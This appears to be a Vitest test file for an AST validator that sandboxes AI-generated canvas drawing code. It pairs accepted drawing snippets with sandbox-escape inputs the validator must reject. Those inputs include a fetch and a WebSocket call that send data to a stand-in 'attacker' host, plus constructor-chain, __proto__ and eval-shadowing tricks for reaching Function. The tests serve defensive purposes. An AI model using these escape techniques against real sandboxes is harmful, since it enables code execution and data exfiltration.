import { describe, it, expect } from "vitest";
import { validateDraw } from "./ast-validator";

describe("validateDraw - happy path (typical AI draws)", () => {
  it("accepts a basic ctx fillStyle + arc + fill draw", () => {
    const r = validateDraw(`
      ctx.fillStyle = "rgba(255, 100, 50, " + (0.5 + Math.sin(t * 0.005) * 0.3) + ")";
      ctx.beginPath();
      ctx.arc(x, y, 12, 0, Math.PI * 2);
      ctx.fill();
    `);
    expect(r.ok).toBe(true);
  });

  it("accepts gradients", () => {
    const r = validateDraw(`
      const g = ctx.createRadialGradient(x, y, 0, x, y, 24);
      g.addColorStop(0, "#ff0");
      g.addColorStop(1, "rgba(255,255,0,0)");
      ctx.fillStyle = g;
      ctx.beginPath();
      ctx.arc(x, y, 24, 0, Math.PI * 2);
      ctx.fill();
    `);
    expect(r.ok).toBe(true);
  });

  it("accepts loops with proper local declarations", () => {
    const r = validateDraw(`
      for (let i = 0; i < 8; i++) {
        const angle = i * Math.PI / 4 + t * 0.001;
        const px = x + Math.cos(angle) * 16;
        const py = y + Math.sin(angle) * 16;
        ctx.fillRect(px - 1, py - 1, 2, 2);
      }
    `);
    expect(r.ok).toBe(true);
  });

  it("accepts a projectile-style draw using p.* fields", () => {
    const r = validateDraw(`
      const tx = p.fromX + (p.toX - p.fromX) * p.progress;
      const ty = p.fromY + (p.toY - p.fromY) * p.progress;
      ctx.fillStyle = "orange";
      ctx.beginPath();
      ctx.arc(tx, ty, 6, 0, Math.PI * 2);
      ctx.fill();
    `);
    expect(r.ok).toBe(true);
  });

  it("accepts an effect-style draw using e.* fields", () => {
    const r = validateDraw(`
      const alpha = 1 - e.progress;
      ctx.fillStyle = "rgba(255,120,0," + alpha + ")";
      ctx.beginPath();
      ctx.arc(e.x, e.y, 8 + e.progress * 20, 0, Math.PI * 2);
      ctx.fill();
    `, { params: ["ctx", "e", "t"] });
    expect(r.ok).toBe(true);
  });

  it("accepts brain hooks spawning cosmetic effects/projectiles", () => {
    const r = validateDraw(`
      if (!state.cooldown || state.cooldown <= 0) {
        world.spawnEffect({ kind: "spark", x: self.x, y: self.y, ttl: 300 });
        world.spawnProjectile({ kind: "wisp", fromX: self.x, fromY: self.y, toX: self.x + facing * 20, toY: self.y, ttl: 400 });
        state.cooldown = 5;
      }
      state.cooldown = state.cooldown - dt;
    `, { params: ["self", "world", "dt", "state"] });
    expect(r.ok).toBe(true);
  });

  it("accepts using owner / facing for color/orientation logic", () => {
    const r = validateDraw(`
      ctx.fillStyle = owner.color === "w" ? "white" : "black";
      ctx.translate(facing * 4, 0);
      ctx.fillRect(-4, -4, 8, 8);
    `);
    expect(r.ok).toBe(true);
  });

  it("accepts the random parameter for procedural variation", () => {
    const r = validateDraw(`
      for (let i = 0; i < 5; i++) {
        const r1 = random();
        ctx.fillRect(x + r1 * 20 - 10, y + r1 * 20 - 10, 2, 2);
      }
    `);
    expect(r.ok).toBe(true);
  });
});

describe("validateDraw - sandbox escape attempts (these MUST reject)", () => {
  it("rejects fetch", () => {
    const r = validateDraw(`fetch("//attacker/?" + ctx.fillStyle);`);
    expect(r.ok).toBe(false);
    expect(r.reason).toMatch(/fetch/);
  });

  it("rejects XMLHttpRequest", () => {
    const r = validateDraw(`new XMLHttpRequest();`);
    expect(r.ok).toBe(false);
  });

  it("rejects WebSocket", () => {
    const r = validateDraw(`new WebSocket("wss://attacker");`);
    expect(r.ok).toBe(false);
  });

  it("rejects window / document / globalThis / parent / top", () => {
    for (const id of ["window", "document", "globalThis", "parent", "top"]) {
      const r = validateDraw(`${id}.location;`);
      expect(r.ok, `${id} should reject`).toBe(false);
    }
  });

  it("rejects eval and Function constructors", () => {
    expect(validateDraw(`eval("1");`).ok).toBe(false);
    expect(validateDraw(`new Function("return 1")();`).ok).toBe(false);
    expect(validateDraw(`Function("return 1")();`).ok).toBe(false);
  });

  it("rejects setTimeout / setInterval / requestAnimationFrame", () => {
    expect(validateDraw(`setTimeout(() => {}, 1);`).ok).toBe(false);
    expect(validateDraw(`setInterval(() => {}, 1);`).ok).toBe(false);
    expect(validateDraw(`requestAnimationFrame(() => {});`).ok).toBe(false);
  });

  it("rejects localStorage / sessionStorage / indexedDB / cookies", () => {
    expect(validateDraw(`localStorage.setItem("x", "y");`).ok).toBe(false);
    expect(validateDraw(`sessionStorage.getItem("x");`).ok).toBe(false);
    expect(validateDraw(`indexedDB.open("x");`).ok).toBe(false);
  });

  it("rejects the constructor escape pattern", () => {
    // Classic prototype-escape: get to `Function` via any object's
    // .constructor.constructor.
    const r = validateDraw(`
      const f = (0).constructor.constructor("return 1")();
    `);
    expect(r.ok).toBe(false);
    expect(r.reason).toMatch(/constructor|banned/i);
  });

  it("rejects __proto__ access", () => {
    const r = validateDraw(`const x = {}.__proto__;`);
    expect(r.ok).toBe(false);
  });

  it("rejects prototype access on identifiers", () => {
    const r = validateDraw(`Array.prototype.push;`);
    expect(r.ok).toBe(false);
  });

  it("rejects ctx.fillText (no arbitrary text rendering)", () => {
    const r = validateDraw(`ctx.fillText("slur", x, y);`);
    expect(r.ok).toBe(false);
    expect(r.reason).toMatch(/fillText/);
  });

  it("rejects ctx.strokeText", () => {
    const r = validateDraw(`ctx.strokeText("x", 0, 0);`);
    expect(r.ok).toBe(false);
  });

  it("rejects ctx.drawImage (no external image loading)", () => {
    const r = validateDraw(`ctx.drawImage(externalImg, x, y);`);
    expect(r.ok).toBe(false);
  });

  it("rejects ctx.getImageData / putImageData / toDataURL", () => {
    expect(validateDraw(`ctx.getImageData(0, 0, 1, 1);`).ok).toBe(false);
    expect(validateDraw(`ctx.putImageData(d, 0, 0);`).ok).toBe(false);
    expect(validateDraw(`ctx.toDataURL();`).ok).toBe(false);
  });

  it("rejects ctx.measureText (font fingerprinting)", () => {
    expect(validateDraw(`ctx.measureText("test");`).ok).toBe(false);
  });

  it("rejects new Image()", () => {
    const r = validateDraw(`new Image();`);
    expect(r.ok).toBe(false);
  });

  it("rejects Date.now() (replay-unfriendly)", () => {
    const r = validateDraw(`const tt = Date.now();`);
    expect(r.ok).toBe(false);
  });

  it("rejects new Date()", () => {
    const r = validateDraw(`new Date();`);
    expect(r.ok).toBe(false);
  });

  it("rejects with statements (name-resolution bypass)", () => {
    const r = validateDraw(`with (ctx) { fillRect(0, 0, 10, 10); }`);
    expect(r.ok).toBe(false);
    expect(r.reason).toMatch(/with/);
  });

  it("rejects tagged template literals", () => {
    const r = validateDraw('eval`return 1`;');
    expect(r.ok).toBe(false);
  });

  it("rejects dynamic property access (a[b] with non-literal b)", () => {
    const r = validateDraw(`
      const k = "fillStyle";
      ctx[k] = "red";
    `);
    expect(r.ok).toBe(false);
    expect(r.reason).toMatch(/dynamic property access/);
  });

  it("rejects literal-key access to a banned member", () => {
    const r = validateDraw(`
      const oops = ctx["fillText"];
    `);
    expect(r.ok).toBe(false);
    expect(r.reason).toMatch(/fillText|banned/);
  });

  it("rejects async functions / await", () => {
    expect(validateDraw(`(async () => { await 1; })();`).ok).toBe(false);
    expect(validateDraw(`async function f() { return 1; }`).ok).toBe(false);
  });

  it("rejects classes (constructor + prototype escape vector)", () => {
    const r = validateDraw(`class X {}`);
    expect(r.ok).toBe(false);
  });

  it("rejects import / dynamic import", () => {
    expect(validateDraw(`import("foo");`).ok).toBe(false);
  });

  it("rejects this (the runtime doesn't bind it)", () => {
    const r = validateDraw(`this.x = 1;`);
    expect(r.ok).toBe(false);
  });

  it("rejects huge new Array() allocation", () => {
    const r = validateDraw(`const big = new Array(1000000);`);
    expect(r.ok).toBe(false);
    expect(r.reason).toMatch(/4096/);
  });

  it("rejects catch with binding (shadow-an-allowlisted-id attack)", () => {
    const r = validateDraw(`try { 1; } catch (eval) { eval("1"); }`);
    expect(r.ok).toBe(false);
    expect(r.reason).toMatch(/catch binding/);
  });

  it("accepts empty catch (no shadowing risk)", () => {
    const r = validateDraw(`try { 1; } catch { }`);
    expect(r.ok).toBe(true);
  });

  it("rejects unknown bare identifier (default-deny)", () => {
    const r = validateDraw(`obscure_global.thing();`);
    expect(r.ok).toBe(false);
    expect(r.reason).toMatch(/obscure_global.*allowlist/);
  });

  it("rejects Reflect / Proxy", () => {
    expect(validateDraw(`Reflect.get({}, "x");`).ok).toBe(false);
    expect(validateDraw(`new Proxy({}, {});`).ok).toBe(false);
  });

  it("rejects Symbol (used in iterator-protocol escape)", () => {
    const r = validateDraw(`Symbol.iterator;`);
    expect(r.ok).toBe(false);
  });

  it("rejects WebAssembly", () => {
    const r = validateDraw(`WebAssembly.compile(bytes);`);
    expect(r.ok).toBe(false);
  });

  it("rejects parseFloat reaching Function via .constructor chain", () => {
    // parseFloat IS allowlisted, but parseFloat.constructor === Function
    const r = validateDraw(`parseFloat.constructor("return 1")();`);
    expect(r.ok).toBe(false);
    expect(r.reason).toMatch(/constructor|banned/);
  });
});

describe("validateDraw - edge cases the security check needs to handle right", () => {
  it("accepts shadowing an allowlisted name with a local (locals win)", () => {
    // The user writes their own local Math; that's their choice and
    // doesn't grant elevated privileges since the local can't reach
    // outside the function scope.
    const r = validateDraw(`
      const Math2 = { sqrt: function (n) { return n; } };
      ctx.fillRect(x, y, Math2.sqrt(16), 4);
    `);
    expect(r.ok).toBe(true);
  });

  it("rejects an unknown member on Math (e.g. Math.thing)", () => {
    const r = validateDraw(`Math.thing();`);
    expect(r.ok).toBe(false);
  });

  it("accepts numeric literal index access on arrays (a[0])", () => {
    const r = validateDraw(`
      const arr = [1, 2, 3];
      ctx.fillRect(x, y, arr[0], arr[1]);
    `);
    expect(r.ok).toBe(true);
  });

  it("rejects source longer than 8KB", () => {
    const huge = "ctx.fillRect(0,0,1,1);\n".repeat(500);
    const r = validateDraw(huge);
    expect(r.ok).toBe(false);
    expect(r.reason).toMatch(/too long/);
  });

  it("returns line/col on rejection for debugging", () => {
    const r = validateDraw(`\nfetch("//x");`);
    expect(r.ok).toBe(false);
    expect(r.line).toBeDefined();
    expect(r.col).toBeDefined();
  });

  it("rejects a parse error gracefully", () => {
    const r = validateDraw(`function ( {`);
    expect(r.ok).toBe(false);
    expect(r.reason).toMatch(/parse error/);
  });
});
